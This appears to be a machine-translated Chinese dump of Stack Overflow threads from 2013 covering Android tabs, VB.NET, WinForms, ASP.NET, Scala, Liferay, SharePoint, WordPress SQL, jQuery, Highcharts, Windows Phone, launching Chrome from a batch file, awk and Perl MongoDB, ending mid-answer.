在我的应用程序中，我想在屏幕中间放置标签，并且顶部的 gMap 无论如何都可以将标签放置在屏幕中间？

这是一个原始设计

[![一只忙碌的猫](../Images/ed5227c5bc6b589565ffe19b7b1eb1fe.png)](https://i.stack.imgur.com/XYltM.png)
[（来源：[qnex.me](http://nairdat.qnex.me/ab_tabs.png)）]

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:50:57.723

您可以将 ViewPagerIndicator 库（使用 TabPageIndicator 控件）与 ViewPager 控件一起使用，它们与 ActionBar 完全分离，可以放置在您喜欢的任何位置。下载源代码并查看示例应用程序。代码非常简单。

这是直接来自示例应用程序源的示例

[https://github.com/JakeWharton/Android-ViewPagerIndicator/blob/master/sample/res/layout/simple_tabs.xml](https://github.com/JakeWharton/Android-ViewPagerIndicator/blob/master/sample/res/layout/simple_tabs.xml)

# c# - 为什么匿名 Action 可以在 C# 中的一行调用，而 VB 不行？

> ID：14348817
> 
> 赞同：3
> 
> 时间：2013-01-15T23:25:38.797
> 
> 标签：c#, .net, vb.net

在 C# 中

```
(new Action(() => MessageBox.Show("Hello"))).BeginInvoke(null, null); 
```

在 VB 中，翻译后的代码无法编译

```
(New Action(Sub() MessageBox.Show("Hello"))).BeginInvoke(nothing, nothing) 
```

但是在 VB 中，我可以将 BeginInvoke 的结果设置为隐式变量`a`，它会运行（感谢@Ric 在另一篇文章中的建议）

```
Dim a = (New Action(Sub() MessageBox.Show("Hello"))).BeginInvoke(Nothing, Nothing) 
```

但现在我想知道为什么 VB 在这种情况下需要在左侧设置一些东西，而 C# 不需要。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T23:31:54.023

VB.NET 只需要一个标识符。您不能像那样直接调用 sub 或其他成员。但是，您可以`Call`改为使用。

> 当被调用的表达式不以标识符开头时，通常使用 Call 关键字。不建议将 Call 关键字用于其他用途。
> 
> [http://msdn.microsoft.com/en-us/library/sxz296wz(v=vs.110).aspx](http://msdn.microsoft.com/en-us/library/sxz296wz(v=vs.110).aspx)

```
Call (New Action(Sub() MessageBox.Show("Hello"))).BeginInvoke(nothing, nothing) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:30:58.660

VB 不允许在实例化上直接调用成员调用。利用：

```
CType(New Action(Function() MessageBox.Show("Hello")), Action).BeginInvoke(Nothing, Nothing) 
```

# c# - WinForm TextBox AutoComplete 在“/”处停止斜线字符

> ID：14348819
> 
> 赞同：2
> 
> 时间：2013-01-15T23:25:45.820
> 
> 标签：c#, winforms, visual-studio

我有一个 WinForm 文本框的 AutoCompleteMode 设置为 SuggestAppend。此 TextBox 有一个 AutoCompleteCustomSource，它是公司名称的列表。

如果自动完成项目名称中包含“/”斜线，则自动完成将仅显示“/”字符之前的部分文本。

例如，如果我们有一个像“ABC Energy P/L”这样的公司名称，自动完成将只显示“ABC Energy P/”而没有 L。

我四处寻找，找到了这个回复。 [http://social.msdn.microsoft.com/Forums/en-US/winforms/thread/55c91e04-0cbd-4189-84be-cb1258447ae5](http://social.msdn.microsoft.com/Forums/en-US/winforms/thread/55c91e04-0cbd-4189-84be-cb1258447ae5) 它指出自动完成功能是开箱即用的，MS borthers 中没有人返回并放置一个 if 语句来修补它。但我不乐意将其作为答案。我希望那里的人会有比重写自动（内）完全控制更好的解决方案。

# c# - C#中如何通过ID查找元素

> ID：14348823
> 
> 赞同：5
> 
> 时间：2013-01-15T23:26:31.243
> 
> 标签：c#, asp.net, .net

我想在 C# 中做这样的事情

```
var id = "myID";
id.innerText = "Hello World"; 
```

我是新手，我相信这很简单。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T23:30:54.570

在 ASP.NET 中，这几乎没有必要。例如，如果您有一个名为“txtMyTextBox”的文本框，您可以简单地执行`txtMyTextBox.Text = "Hello World";`. 您可以对任何具有该`runat="server"`属性的元素执行此操作。

如果需要从字符串中查找，可以使用`FindControl("txtMyTextBox")`，但请注意，这不会递归搜索。它只会找到您调用它的控件的直接子级。（您可以使用[递归算法递归](http://www.blackbeltcoder.com/Articles/asp/recursively-finding-controls)地查找控件）。

最后，如果你想通过它的 HTML ID 来专门引用一个元素，你不能这样做。C# 在服务器上运行，不能直接访问页面。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:32:03.720

有很多方法可以做到这一点

```
XmlDocument() doc = new XmlDocument();
doc.LoadXml(@"<SomeNodeName id = "myID">Hello World</SomeNodeName>"; 
```

好吧，你在那里提到了innerText，愚弄了我。

除非我真的不得不这样做，否则我个人不会这样做。

```
int positionInArray = myGame.IndexOf("MyDiv" + id.ToString()); 
```

上面有大量假设。找出可能出现的问题将是一个非常好的学习练习。

提到字典的答案，在有人投反对票后被删除，这将是一个更好的方法

```
public class SomeObject
{
   private Dictionary<int, String> myGames;
   public SomeObject()
   {
      myGames = new Dictionary<int, string>();
   }
   public AddGame(int id, string desc)
   {
       myGames.Add(id,desc);
   }
   public string FindGameById(int id)
   {
      if(myGames.ContainsKey(id))
      {
         return myGames[id];
      }
      return null;
   }
} 
```

# xml - 将字符串反序列化为 scala.xml.Elem 的最快方法是什么？

> ID：14348825
> 
> 赞同：1
> 
> 时间：2013-01-15T23:26:43.670
> 
> 标签：xml, scala

Scala 似乎非常擅长序列化`scala.xml.Elem`（在我的机器上它每秒执行大约 150k），但是使用反序列化似乎很慢（每秒 10k）`XML.loadString`

最快的替代方案是什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T23:53:18.467

虽然它不是更快的 scala.xml.Elem 反序列化[Scales Xml的答案，但它在](https://github.com/chris-twiner/scalesXml "Scales Xml Github")[内存使用量低得多](http://scala-scales.googlecode.com/svn/sites/scales/scales-xml_2.9.2/0.4.4/MemoryOptimisation.html "秤性能")的情况下表现得非常好。它提供了默认库中也不存在的大量功能。

Scales 允许您在显着降低内存使用率和解析性能之间进行权衡。默认值旨在取得很大的平衡。

# liferay-6 - Liferay Alloy UI 分页器

> ID：14348826
> 
> 赞同：1
> 
> 时间：2013-01-15T23:26:45.003
> 
> 标签：liferay-6, alloy-ui

嗨，我正在按照演示示例使用合金 ui 分页器

[https://www.liferay.com/community/liferay-projects/alloy-ui/demo?title=community-liferay-projects-alloy-ui-demos-paginator](https://www.liferay.com/community/liferay-projects/alloy-ui/demo?title=community-liferay-projects-alloy-ui-demos-paginator)

这是我的网页内容模板代码：

```
#set($allTags = [])
#set($void = $allTags.add('news'))
#set($void = $allTags.add('alert'))

#set($tempArr=[])
#set($tempArr=$allTags)
#set($arr=$tempArr.toArray($allTags))
#set($stringArray=$arrayUtil.toStringArray($arr))

#set($assetTagLocalService = $serviceLocator.findService("com.liferay.portlet.asset.service.AssetTagLocalService"))
#set($tagIds = $assetTagLocalService.getTagIds($groupId,$stringArray))

#set($assetEntryQuery = $portal.getClass().forName("com.liferay.portlet.asset.service.persistence.AssetEntryQuery" ).newInstance()) 
#set($V1 = $assetEntryQuery.setAnyTagIds($tagIds))

#set($className = $portal.getClass().forName("com.liferay.portlet.journal.model.JournalArticle").getName())
#set($V2 = $assetEntryQuery.setClassName($className))

#set($assetEntryLocalService = $serviceLocator.findService("com.liferay.portlet.asset.service.AssetEntryLocalService"))
#set($assetEntryList = $assetEntryLocalService.getEntries($assetEntryQuery))

#set($journalArticleResourceService =$serviceLocator.findService('com.liferay.portlet.journal.service.JournalArticleResourceLocalService'))
#set($journalArticleService =$serviceLocator.findService('com.liferay.portlet.journal.service.JournalArticleLocalService'))

<style type="text/css">
.aui-paginator-container {
    margin: 30px;
}

.paginator-content {
    border: 2px solid #CCCCCC;
    font-size: 15px;
    margin: -10px 40px;
    padding: 10px;
    width: 534px;
}

.paginator-content div {
    display: none;
}
</style>

<script type="text/javascript">

AUI().ready('aui-paginator', function(A) {
    var paginator = new A.Paginator(
        {
            containers: '.paginator',
            maxPageLinks: 10,
            on: {
                changeRequest: function(event) {
                    var instance = this;
                    var newState = event.state;
                    var page = newState.page;

                    if (newState.before) {
                        var lastPage = newState.before.page;

                        A.one('.paginator-content .page' + lastPage).setStyle('display', 'none');
                    }

                    A.one('.paginator-content .page' + page).setStyle('display', 'block');

                    instance.setState(newState);
                }
            },
            rowsPerPage: 3,
            rowsPerPageOptions: [ 1, 3, 5, 7 ],
            total: 10
        }
    )
    .render();
});

</script>

<div class="main-col">
    <div id="post-list" class="pane">
        <div class="pane-heading">
            <h1>News &amp; Alerts</h1>
        </div>
        <div class="pane-heading">
            <select id="filter-report-tld" name="filter-report-tld">
                <option value="">Choose a filter...</option>
                <option value="all" selected="selected">All news & alerts</option>
                <option value="academy">News</option>
                <option value="corp">Alerts</option>
            </select>
                <div class="clear"></div>
        </div>
        <div class="pane-body">
            <div class="post-table">
                <div class="post-list-hg">
                    <div class="post-list-title"><a href="xxx">Title</a> - $assetEntryList.size() items</div>
                    <div class="post-list-date sort-descend"><a href="xxx">Post date</a></div>
                </div>
                <div class="paginator"></div>
                <div class="paginator-content">
                    #set ($counter = 1)
                    #foreach($assetEntry in $assetEntryList)
                        #set($articleResource = $journalArticleResourceService.getJournalArticleResource($assetEntry.getClassPK()))
                        #set($article = $journalArticleService.getArticle($groupId,$articleResource.getArticleId()))

                        #set ($document = $saxReaderUtil.read($article.title))
                        #set ($root = $document.getRootElement())

                        #set ($articleTitle = $root.selectSingleNode("Title").getText())

                        <div class="page$counter">
                            $articleTitle
                        </div>
                        #set ($counter = $counter + 1)
                    #end
                </div>  
                <div class="paginator"></div>
            </div>
        </div>
    </div>
</div> 
```

你能告诉我如何使用alloyUI分页器在我的foreach循环中显示项目吗？现在每个项目都出现在一页中。

# sharepoint-2010 - 如何在 sharepoint 2010 的 EditForm.aspx 中禁用 eventValidation

> ID：14348827
> 
> 赞同：0
> 
> 时间：2013-01-15T23:26:52.913
> 
> 标签：sharepoint-2010

我正在使用一些 javascript 将新项目添加到编辑表单上少于 20 个项目的查找列下拉列表中。

当我单击保存时，我收到一条错误消息，指出回发或回调参数无效。使用配置或页面中的 <%@ Page EnableEventValidation="true" %> 启用事件验证。出于安全目的，此功能验证回发或回调事件的参数是否源自最初呈现它们的服务器控件。如果数据有效且符合预期，请使用 ClientScriptManager.RegisterForEventValidation 方法注册回发或回调数据以进行验证。

如果我添加 Page EnableEventValidation="false" 我会收到一个解析器错误，说明：在解析服务此请求所需的资源期间发生错误。请查看以下特定的解析错误详细信息并适当地修改您的源文件。

解析器错误消息：此页面中不允许页面指令上的 enableeventvalidation 属性。

事件日志显示 Microsoft.SharePoint.WebPartPages.WebPartPageUserException：此页面中不允许页面指令上的 enableeventvalidation 属性。STACKTRACE：Microsoft.SharePoint.WebPartPages.WebPartPageUserException：此页面中不允许页面指令上的 enableeventvalidation 属性。
在 Microsoft.SharePoint.ApplicationRuntime.SPPageParserFilter.PreprocessDirective（字符串指令名称，IDictionary 属性）
在 System.Web.UI.TemplateParser.ParseStringInternal（字符串文本，编码文件编码）

我检查了我的 web.config，它没有页面 enableEventValidation

如何在 sharepoint 中禁用 eventValidation。[希望以每页为基础]？还是我必须使用信息路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-31T05:31:54.847

在 sharepoint 中设置 EnableEventValidation="False" 不是一个好的解决方案，因为它是安全功能。我有使用 javascript 修改下拉列表元素的经验，它给了我相同的错误消息。我通过在后面的代码中添加方法 protected override void Render(HtmlTextWriter writer) 找到了解决此错误的方法。

```
protected override void Render(HtmlTextWriter writer)
{
   //Set Dropdownlist Value
   ddlOption.Add("value");
   base.Render(writer);
} 
```

# php - Wordpress 自定义 SQL 查询和组连接

> ID：14348833
> 
> 赞同：2
> 
> 时间：2013-01-15T23:27:21.493
> 
> 标签：php, sql, wordpress, group-concat

我正在尝试运行以下查询以获取 object_id 的唯一结果。我认为使用 Group_concat Distinst 可能效果最好。我需要将查询结果用作下一个查询的 where 子句中的变量。

下面的查询在 flyspeedsql 软件中运行良好，但我似乎无法在 php.ini 中看到结果。

有没有更好的方法来解决这个问题？

wordpress get_results 是正确使用的功能吗？

它应该返回链接 55,56,57

同样从这个查询的结果中，我如何设置一个可以在下一个查询的 where 子句中使用的变量？

查询 1

```
 $query = ("Select
         Group_Concat(Distinct $wpdb->term_relationships.object_id)
      From
           $wpdb->term_taxonomy Inner Join
           $wpdb->term_relationships On $wpdb->term_taxonomy.term_taxonomy_id =
           $wpdb->term_relationships.term_taxonomy_id Inner Join
           $wpdb->terms On $wpdb->term_taxonomy.term_id = $wpdb->terms.term_id
       Where
           $wpdb->terms.name = 'Honda' And
           $wpdb->term_taxonomy.taxonomy = 'brands'");

       $results = $wpdb->get_results($query); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T08:29:55.950

你听说过 MYSQL[子查询吗？](http://dev.mysql.com/doc/refman/5.0/en/subqueries.html)

老实说，我自己并没有阅读整篇文章，但我对这个概念非常了解，可以用 1 个查询来做你想做的事情（虽然它会很可怕）

```
Select
     $wpdb->some_other_table.some_field
From
     $wpdb->some_other_table
Where
     $wpdb->some_other_table.some_other_field = (Select
       Group_Concat(Distinct $wpdb->term_relationships.object_id)
  From
       $wpdb->term_taxonomy Inner Join
       $wpdb->term_relationships On $wpdb->term_taxonomy.term_taxonomy_id =
       $wpdb->term_relationships.term_taxonomy_id Inner Join
       $wpdb->terms On $wpdb->term_taxonomy.term_id = $wpdb->terms.term_id
   Where
       $wpdb->terms.name = 'Honda' And
       $wpdb->term_taxonomy.taxonomy = 'brands'); 
```

我不知道这是否会 100% 满足您的需求，因为您的描述相当模糊，但我相信您可以弄清楚如果它是一个解决方案，您可以弄清楚如何为您工作。

# jquery - 带有下一个和上一个按钮的 Jquery 幻灯片，我需要一段代码将幻灯片重置为第一个图像

> ID：14348834
> 
> 赞同：1
> 
> 时间：2013-01-15T23:27:23.847
> 
> 标签：jquery, html

我对 jquery 很陌生，希望有人可以帮助我解决我遇到的这个小问题。我非常肯定我想要的这段特定代码对于有更多经验的人来说很容易，因此这篇文章。

我有一个带有下一个和上一个按钮的 Jquery 幻灯片。当我去站点的其他部分并回来时，幻灯片仍然在最后显示的图片上（我关闭了自动幻灯片）。在此示例中，当我转到站点的其他部分时，幻灯片是隐藏的。

所以我想要的是一段代码，它使图像幻灯片重置为第一张图像。

这是我使用的 jquery 和 html：

查询：

```
$(window).load(function() {
            var pages = $('#container #bottom .content .projects .tab .info .slide li'), current = 0;
            var currentPage, nextPage;

            $('#container #bottom .content .projects .tab .info .knoppen .buttons').click(function() {
                currentPage = pages.eq(current);
                if ($(this).hasClass('prevPic')) {

                    if (current <= 0)
                        current = pages.length - 1;
                    else
                        current = current - 1;
                } else {
                    if (current >= pages.length - 1)
                        current = 0;
                    else
                        current = current + 1;
                }
                nextPage = pages.eq(current);
                currentPage.hide();
                nextPage.show();
            });
        }); 
```

HTML幻灯片：

```
<div class="slide">
                                        <ul>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl01.gif" />
                                            </li>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl02.gif" />
                                            </li>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl03.gif" />
                                            </li>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl04.gif" />
                                            </li>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl05.gif" />
                                            </li>
                                            <li><img src="img/portfolio/TM_Logos_huisstijl06.gif" />
                                            </li>
                                        </ul>
                                    </div> 
```

我希望我提供了足够的信息，并感谢任何想要达到顶峰的人:)

问候，L.

编辑，这是用于在项目之间滚动的代码，这使得图像在另一个项目中时隐藏起来：

```
 $(".project.buttons.panel").delegate(".button", "click", function onclick() {
    var currentProject$ = $(".projects .current.project")
        , project = "", nextProject$, previousProject$;
    if (this.getAttribute("href").match(/#next$/)) {
        nextProject$ = currentProject$.next();
        // If there is no next project,
        //  then check the first project
        if (nextProject$.length === 0) {
            nextProject$ = $(".projects .project:first");
        }
        // If there is still no project,
        //  then there is something wrong
        if (nextProject$.length === 0) {
            throw new Error("Unable to find a project");
        }
        project = nextProject$.attr("id");
    } else if (this.getAttribute("href").match(/#previous$/)) {
        previousProject$ = currentProject$.prev();
        // If there is no previous project,
        //  then check the last project
        if (previousProject$.length === 0) {
            previousProject$ = $(".projects .project:last");
        }
        // If there is still no project,
        //  then there is something wrong
        if (previousProject$.length === 0) {
            throw new Error("Unable to find a project");
        }
        project = previousProject$.attr("id");
    } else {
        throw new Error("Unknown command");
    }
    hashInfo.change({ project: project, tab: 1 });
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T01:37:58.097

这会做吗，当你在项目之间滚动时，总是在幻灯片 div 中显示第一个 li？

```
$('.slide li').hide().filter(':eq(0)').show(); 
```

# javascript - Highcharts 未以模式启动

> ID：14348835
> 
> 赞同：0
> 
> 时间：2013-01-15T23:27:36.217
> 
> 标签：javascript, charts, highcharts, modal-dialog

我有一个以模式显示的基本高图。它似乎在基本 html 中呈现，但一旦显示模态就不会显示（除非我告诉浏览器做一些事情，比如调整窗口大小或通过制定插件重绘）。老实说，不确定这是 DOM 的事情还是 js 的事情。在 Firefox、Chrome 和 Safari mac 中也是如此。是否有一些简单的东西可以在点击时“鹅”窗口？我正在使用引导 js 标准模态代码

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T23:04:27.187

我在使用 Highcharts 和 Bootstrap 的 Carousel 时遇到了同样的问题。为了解决这个问题，我在使用 Highcharts 绘制元素之前显示元素，然后隐藏它。

[https://github.com/rootux/angular-highcharts-directive/issues/1](https://github.com/rootux/angular-highcharts-directive/issues/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-04T11:18:48.717

图表不能在隐藏的 div 中初始化，所以您可以打开 modal，然后用小时间运行即 setInterval() 函数，然后创建图表。

编辑：看看可以帮助您在隐藏模式 div 中显示图表的解决方案。 [http://docs.highcharts.com/#faq](http://docs.highcharts.com/#faq) $jquery-ui-tab

# windows-phone - 有没有办法从 windows phone 8 的照片卷中选择视频？

> ID：14348838
> 
> 赞同：1
> 
> 时间：2013-01-15T23:27:48.813
> 
> 标签：windows-phone, windows-phone-8

我想创建一个 Windows Phone 8 应用程序，允许用户在手机上查看、标记（画线）和减慢/加速视频。我试图弄清楚如何从用户的照片卷中“加载”视频，以便他们可以在该视频上执行上述功能。

到目前为止，从我的研究中可以看出，不可能从用户的照片卷中“挑选”视频文件。这是我尝试过的两件事：

1.  “PhotoChooserTask” - 只允许图像文件
2.  “FileOpenPicker”类 - 目前不适用于 WP8 [http://social.msdn.microsoft.com/Forums/en-US/wpdevelop/thread/7e4492dc-d8f3-4dc5-8055-625352aaa8b6](http://social.msdn.microsoft.com/Forums/en-US/wpdevelop/thread/7e4492dc-d8f3-4dc5-8055-625352aaa8b6)

我很惊讶，因为目前 WP8 SDK 无法实现如此简单的事情。我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T06:50:57.320

不，仍然没有办法，如何从 MediaLibrary 中选择视频并在您的应用程序中使用它。您只能播放自己的视频，或来自 Internet 的某些视频流。

# javascript - IE - 重新显示输入时隐藏和显示输入不会获得焦点

> ID：14348839
> 
> 赞同：1
> 
> 时间：2013-01-15T23:27:55.563
> 
> 标签：javascript, jquery

我想根据用户是否关注输入来切换输入的可见性。我想让用户能够编辑输入，当他们导航离开时，我想在输入中显示他们刚刚编辑的输入，这将“格式化”编辑的输入。

就我而言，我有两个输入元素。当用户离开“值”输入时，应该显示“显示”输入。下次用户给“显示”输入焦点时，应该给“值”输入焦点，以便用户可以输入一个值。

我整理了一个[jsFiddle](http://jsfiddle.net/hAT7Z/1/)。错误是如果你给第一个输入一个值，点击“虚拟输入”失去对当前输入的关注，然后再次点击第一个输入，就好像第一个输入从未获得焦点一样。（请注意，单击后您将无法立即在键盘上键入任何内容）。同样，这只是 IE 中的一个问题。

注意：如果不是在导航后单击第一个输入，而是使用 tab 键，它会起作用。这似乎只是点击的问题。

```
 <div>
  <label>Give me a value then give the value focus</label>
  <input id="valueInput" type="text" />
    <input id="displayInput" type="text" style="display:none;" />
  <br />
  <label>Dummy Input</label>
  <input type="text" />
</div>

$(window.document).on('blur', "#valueInput", function (e) {
  $(this).hide();
  $("#displayInput").show();
});

$(window.document).on('focus', "#displayInput", function (e) {
  $("#valueInput").show().focus();
  $(this).hide();
});

$("#valueInput").focus(); 
```

jQuery 版本 1.7.2

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T05:17:27.797

基于@Pointy 的评论以及其他一些谷歌搜索，我能够通过以下 Javascript 使其工作。

```
$(window.document).on('blur', "#downPaymentPercent", function (e) {
    $(this).hide();
    $("#downPaymentPercentDisplay").show();
});

$(window.document).on('focus', "#downPaymentPercentDisplay", function (e) {
  var $downPaymentPercent = $("#downPaymentPercent");
    $(this).hide();
  $downPaymentPercent.show();
  // IE work around since the focus call is delayed, set a timed out call
  window.setTimeout(function() {
    $downPaymentPercent.focus();
    // Set cursor to the end of the input
    $downPaymentPercent.val($($downPaymentPercent).val());
  }, 1);
});

$("#downPaymentPercent").focus(); 
```

这是工作的[jsFiddle](http://jsfiddle.net/hAT7Z/8/)

# windows - 从命令行打开 Chrome

> ID：14348840
> 
> 赞同：71
> 
> 时间：2013-01-15T23:27:58.423
> 
> 标签：windows, google-chrome, batch-file, command-prompt

我有以下批处理文件：

```
@echo off
REM Starts a chrome browser with multiple tabbed sites
C:\Users\UserName\AppData\Local\Google\Chrome\Application\chrome.exe "site1.com" "site2.com" 
```

但是当我运行它时，它会导致提示挂起并使其无法使用，直到 Chrome 关闭。（或者，如果我没有使用提示并从图标运行它，它会打开一个无法使用的空白提示，并在 Chrome 关闭时消失。）

有什么办法可以防止这种情况发生吗？IE一旦网页打开，提示不再绑定。

它可以很好地打开网页。我还注意到，如果已经打开了 chrome 窗口，则批处理运行良好（留下可用提示），将选项卡添加到现有的 chrome 会话中。

* * *

## 回答 #1

> 赞同：155
> 
> 时间：2013-01-15T23:30:03.047

看看`start`命令。它应该做你想要达到的目标。

此外，您可能可以省略 chrome 的路径。以下适用于 Windows 7：

`start chrome "site1.com" "site2.com"`

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-10-04T20:54:26.713

使用启动命令如下。

`start "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" http://www.google.com`

在打开新实例之前关闭 chrome 实例会更好。你可以这样做：

```
taskkill /IM chrome.exe
start "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" http://www.google.com 
```

这对你有用。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2014-02-22T15:35:37.177

`C:\>start chrome "http://site1.com"`适用于 Windows Vista。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2018-02-27T12:48:37.367

让我们看一下`start`命令。

打开 Windows 命令提示符

要打开新的 Chrome 窗口（空白），请键入以下内容：

```
start chrome --new-window 
```

或者

```
start chrome 
```

要在 Chrome 中打开 URL，请键入以下内容：

```
start chrome --new-window "http://www.iot.qa/2018/02/narrowband-iot.html" 
```

要在 Chrome 中以隐身模式打开 URL，请键入以下内容：

```
start chrome --new-window --incognito "http://www.iot.qa/2018/02/narrowband-iot.html" 
```

或者

```
start chrome --incognito "http://www.iot.qa/2018/02/narrowband-iot.html" 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-11-23T08:52:16.657

您可以创建批处理文件并将以下行插入其中：

```
cmd /k start chrome "http://yourWebSite.com 
```

之后，您只需双击此批处理文件。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2013-11-05T17:38:35.587

打开命令提示符并输入

```
cd\ (enter) 
```

然后输入

```
start chrome "www.google.com"(any website you require) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-11-07T12:37:22.417

如果要打开隐身窗口，请输入以下命令：

启动铬/隐身

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-11-18T07:03:59.427

回答此问题供`Ubuntu`用户参考。

运行命令`google-chrome --app-url "http://localhost/"`

在参数中替换您想要的 URL。

您可以获得更多选项，例如隐身模式等。运行`google-chrome --help`以查看选项。

# scala - 从键盘读取日期直到它正确 - 在scala中

> ID：14348841
> 
> 赞同：2
> 
> 时间：2013-01-15T23:27:59.190
> 
> 标签：scala, date, iterator

我想不断提示用户以给定格式输入日期，直到他/她正确为止。

这就是我所做的：

```
def readDate(prompt: String): Date = {
    var date: Option[Date] = None
    Iterator.continually {
      val startDateString = readLine(prompt)
      val startDate = catching(classOf[ParseException]).opt(asDate(startDateString))
      date = startDate
      startDate
    }.takeWhile(_ == None).foreach {
      date =>
        println("Incorrect format. Try again.")
    }
    date.get
  } 
```

`asDate`仅`SimpleDateFormat.parse`在输入的字符串上使用。

现在，这似乎可行，但我很确定这不是正确的方法。

我真的不明白如何处理这些链式迭代器（因为 Iterator.continually 和 takeWhile 都返回 AbstractIterator 的实例）。

我基本上有两个问题：

1）有没有办法从“返回`startDate`” `Iterator.continually`？我已经尝试过并且失败了 - `map`ping 它。我想要这个以摆脱`var date`and `date = startDate`。

2）如果我不想在读取之间发生任何事情，我会如何处理最后一个 foreach？我已经看到，如果我只是将其删除（我认为是因为 next() 没有被调用），则没有任何效果，但是可以像这样将它留在那里：

`takeWhile(_ == None).foreach { date => {}}`?

有没有比“空”foreach 更好的方法？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:53:48.843

您应该使用`find`而不是`takeWhile`--this 将继续删除条目，直到一个好的条目出现。然后你有一个`Option`，所以你只需要

```
def readDate(prompt: String): Date = {
  Iterator.continually {
    catching(classOf[ParseException]).opt(asDate( readLine(prompt) ))
  }.find(_.isDefined).get
} 
```

如果你不想打印任何东西。如果您确实想打印某些内容，可以将其放入循环中。

```
def readDate(prompt: String): Date = {
  Iterator.continually {
    catching(classOf[ParseException]).opt(asDate( readLine(prompt) )) match {
      case None =>
        println("Incorrect format.  Try again.")
        None
      case x => x
    }
  }.find(_.isDefined).get
} 
```

我不确定这是否更清晰，但它肯定更短并且可以完成您想要的那些事情。

我可能会改用尾递归函数：

```
import annotation.tailrec
@tailrec def readDate(prompt: String, again: Boolean = false): Date = {
  if (again) println("Incorrect format.  Try again.")
  catching(classOf[ParseException]).opt(asDate( readLine(prompt) )) match {
    case Some(date) => date
    case None => readDate(prompt, true)
  }
} 
```

这里的逻辑对我来说似乎更清楚一些。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T11:10:01.403

我会把它写成

```
def readDate(prompt: String): Date = 
  try asDate(readLine(prompt))
  catch { case e: ParseException => 
    println("Incorrect format. Try again.")
    readDate(prompt)
  } 
```

# bash - bash计算人的年龄并读取到csv文件？

> ID：14348843
> 
> 赞同：-1
> 
> 时间：2013-01-15T23:28:08.157
> 
> 标签：bash, awk

我有一个 csv 文件，其中包含三列读取名称、邮政编码、年龄 dd/mm/yy。我想从今天的日期计算每个条目的年龄并输出到 csv 文件的第四列？我知道 awk 很方便，但我不知道从各个列读取和写入数据并创建一个新的！例如

```
name,postcode,dob,age
Dave,ws245f,09/12/2000,13 
```

我有以下输入

```
`cat estimateAge.csv|awk -F'/|,' '{b=mktime($5" "$4" "$3" 00 00 00 00");a (systime()-b)/(365*24*60*60);a=a==int(a)?a:int(a)+1;print $0","a}`' 
```

这是输出

```
Joe Bloggs,0121 545465650,01/03/1982,31 
```

输出应该是

```
Joe Bloggs,0121 545465650,01/03/1982,30 
```

请注意，年龄计算不正确，因为 Joe Bloggs 直到 3 月才 31 岁

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:57:54.333

我认为这个问题的核心部分不是在末尾添加新的年龄字段。但年龄计算。

尝试这个：

```
awk -F'/|,' '{b=mktime($5" "$4" "$3" 00 00 00 00");a=(systime()-b)/(365*24*60*60);a=a==int(a)?a:int(a)+1;print $0","a}' file 
```

好吧，也许我不应该把它们放在一行中：

```
awk -F'/|,' '{b=mktime($5" "$4" "$3" 00 00 00 00");
              a=(systime()-b)/(365*24*60*60);
              a=a==int(a)?a:int(a)+1;print $0","a}' file 
```

使用您的示例数据进行测试：

```
kent$  echo "Dave,ws245f,09/12/2000"|awk -F'/|,' '{b=mktime($5" "$4" "$3" 00 00 00 00");a=(systime()-b)/(365*24*60*60);a=a==int(a)?a:int(a)+1;print $0","a}' 
Dave,ws245f,09/12/2000,13 
```

如您所见，我没有检查标题行，`NR>1`检查很容易跳过标题。你可以DIY。

希望能帮助到你

# perl - 如何在 Perl 中从 mongoDB 获取返回的数据？

> ID：14348845
> 
> 赞同：6
> 
> 时间：2013-01-15T23:28:20.290
> 
> 标签：perl, mongodb

我阅读了[http://api.mongodb.org/perl/current/MongoDB/Examples.html](http://api.mongodb.org/perl/current/MongoDB/Examples.html)并且似乎只是 mongoDB 在 Perl 上的文档。如何在 perl 中从 mongoDB 获取查询结果。让我们说成哈希。到目前为止，我已成功连接到数据库。我设法在集合中插入。现在我如何发出选择查询并将其返回的数据转换为哈希或类似的东西？

更新：

```
Example of my data
{
 "_id" : ObjectId("asdhgajsdghajgh"),
 "country" : "USA"
 "city" : "Boston"
}

{
 "_id" : ObjectId("asdhgajsdghajgh"),
 "country" : "USA"
 "city" : "Seattle"
}

{
 "_id" : ObjectId("asdhgajsdghajgh"),
 "country" : "Canada"
 "city" : "Calgary"
}

My code

my $cursor = $my_collection
    ->find({ country => 1 }) 
    ;
while (my $row = $cursor->next) {
    print "$row\n";
} 
```

此代码不会产生任何输出。我想基本上遍历整个集合并逐个文档阅读。不知道我做错了什么。我使用了上面的代码。我将 $cur->next 更改为 $cursor->next 我猜这是一个错字。到目前为止，我感谢所有答案。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-01-15T23:34:48.670

那不是官方文档。前往 CPAN：

